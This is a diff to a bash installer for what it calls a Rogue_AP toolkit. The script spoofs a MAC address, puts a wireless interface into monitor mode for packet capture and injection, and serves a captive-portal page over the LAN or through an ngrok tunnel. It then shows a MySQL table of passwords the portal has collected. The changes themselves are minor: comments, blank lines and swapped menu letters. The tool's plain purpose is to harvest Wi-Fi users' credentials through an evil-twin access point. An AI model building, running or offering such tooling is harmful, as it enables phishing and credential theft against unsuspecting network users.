@@ -11,6 +11,7 @@ cat <<-_EOF_
 sleep 1
 
 # Section defines variables and create file paths to ensure directories are properly filled.
+
 NULL=>/dev/null
 INDEX=index.html
 ROGUE=Rogue_AP.zip
@@ -34,6 +35,7 @@ clear
 ##################################################################################################
 
 # Section displays user ip then asks for ip-input, checks if user is running program as root, then installs needed packages and updates system.
+
 ifconfig eth0 | grep "inet\b" | awk '{print $2}' | cut -d/ -f1
 read -p "${yellow}Enter your IP :${resetColor} " IPADDRESS # Make this auto fill 
 clear
@@ -59,6 +61,7 @@ fi
 ##################################################################################################
 
 # Section adds lines to end of NetworkManager.conf these lines stop the airmon + network manager conflict
+
 read -p "${red}This is important to ensure I don't overwrite your files, Have you ran this script before? [y/n]${resetColor} : " NETWORKMGR
 	if [ $NETWORKMGR == n ] ; then
 		echo "" >> /etc/NetworkManager/NetworkManager.conf
@@ -69,9 +72,10 @@ read -p "${red}This is important to ensure I don't overwrite your files, Have yo
 ##################################################################################################
 
 # Section determines if the html packages are required, an ngrok code is required at this time, webserver on lan is hosting the files.
-read -p "${red}Are you installing this with an ngrok code[y] or through lan[n]? Leave blank if you don't need the html files : ${resetColor}" HTML
 
-	if [ $HTML == n ] ; then
+read -p "${red}Are you installing this with an ngrok code[n] or through lan[l]? Leave blank if you don't need the html files : ${resetColor}" HTML
+
+	if [ $HTML == l ] ; then
 		rm -r /var/www/html $NULL
 		sleep 1
 		mkdir /var/www/html/ $NULL
@@ -86,7 +90,7 @@ read -p "${red}Are you installing this with an ngrok code[y] or through lan[n]? 
 		clear
 	fi
 
-	if [ $HTML == y ] ; then
+	if [ $HTML == n ] ; then
 		read -p "${yellow}Enter the code here [example 12345678]: ${resetColor}" NGROK
 		rm -r /var/www/html $NULL
 		sleep 1
@@ -108,6 +112,7 @@ clear
 ##################################################################################################
 
 # Section allows user to select the interface they wish to put into monitor mode, this allows for packet capture and injection. The mac address is then changed to the same as the lines added to networkmanager.conf
+
 iwconfig 
 read -p " Which interface do you wish to use?${resetColor} : " INTERFACE # find way to limit output to just devices
 echo "Changing MAC ... "
@@ -353,6 +358,8 @@ while [[ $(id -u) == 0 ]] ; do
 		fi
 	
 ##################################################################################################
+
+# Section displays the created sql database with stored passwords from the rougue_AP captive portal
 
 		if [[ $CHOICE == 7 ]] ; then
 			mysql -u fakeap -p < SQL-Display.sql					# Displays the contents of the SQL database setup in option 4, with the setup username. User enters password
